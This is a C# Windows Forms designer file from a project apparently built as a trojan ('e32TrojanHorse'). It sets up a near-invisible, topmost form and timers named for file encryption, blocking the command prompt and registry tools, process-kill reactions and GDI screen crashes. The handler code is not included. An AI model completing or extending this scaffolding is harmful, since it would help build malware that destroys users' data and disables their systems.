namespace e32TrojanHorse
{
    partial class InitPayloads
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.StartCreateFoldersAndFiles = new System.Windows.Forms.Timer(this.components);
            this.StartOpenLinksAndApps = new System.Windows.Forms.Timer(this.components);
            this.StartEncryptFiles = new System.Windows.Forms.Timer(this.components);
            this.StartBlockCmdRegisterAndOthers = new System.Windows.Forms.Timer(this.components);
            this.NextPayloads = new System.Windows.Forms.Timer(this.components);
            this.StartSoundsPlayload = new System.Windows.Forms.Timer(this.components);
            this.IFUKILLPROCESS = new System.Windows.Forms.Timer(this.components);
            this.StartGDICrash = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // StartCreateFoldersAndFiles
            // 
            this.StartCreateFoldersAndFiles.Interval = 1;
            this.StartCreateFoldersAndFiles.Tick += new System.EventHandler(this.StartCreateFoldersAndFiles_Tick);
            // 
            // StartOpenLinksAndApps
            // 
            this.StartOpenLinksAndApps.Interval = 5000;
            this.StartOpenLinksAndApps.Tick += new System.EventHandler(this.StartOpenLinksAndApps_Tick);
            // 
            // StartEncryptFiles
            // 
            this.StartEncryptFiles.Interval = 1;
            this.StartEncryptFiles.Tick += new System.EventHandler(this.StartEncryptFiles_Tick);
            // 
            // StartBlockCmdRegisterAndOthers
            // 
            this.StartBlockCmdRegisterAndOthers.Tick += new System.EventHandler(this.StartBlockCmdRegisterAndOthers_Tick);
            // 
            // NextPayloads
            // 
            this.NextPayloads.Interval = 60000;
            this.NextPayloads.Tick += new System.EventHandler(this.NextPayloads_Tick);
            // 
            // StartSoundsPlayload
            // 
            this.StartSoundsPlayload.Tick += new System.EventHandler(this.StartSoundsPlayload_Tick);
            // 
            // IFUKILLPROCESS
            // 
            this.IFUKILLPROCESS.Interval = 1;
            this.IFUKILLPROCESS.Tick += new System.EventHandler(this.IFUKILLPROCESS_Tick);
            // 
            // StartGDICrash
            // 
            this.StartGDICrash.Interval = 170;
            this.StartGDICrash.Tick += new System.EventHandler(this.StartGDICrash_Tick);
            // 
            // InitPayloads
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(10, 10);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "InitPayloads";
            this.Opacity = 0.01D;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "InitPayloads";
            this.TopMost = true;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.InitPayloads_FormClosing);
            this.Load += new System.EventHandler(this.InitPayloads_Load);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer StartCreateFoldersAndFiles;
        private System.Windows.Forms.Timer StartOpenLinksAndApps;
        private System.Windows.Forms.Timer StartEncryptFiles;
        private System.Windows.Forms.Timer StartBlockCmdRegisterAndOthers;
        private System.Windows.Forms.Timer NextPayloads;
        private System.Windows.Forms.Timer StartSoundsPlayload;
        private System.Windows.Forms.Timer IFUKILLPROCESS;
        private System.Windows.Forms.Timer StartGDICrash;
    }
}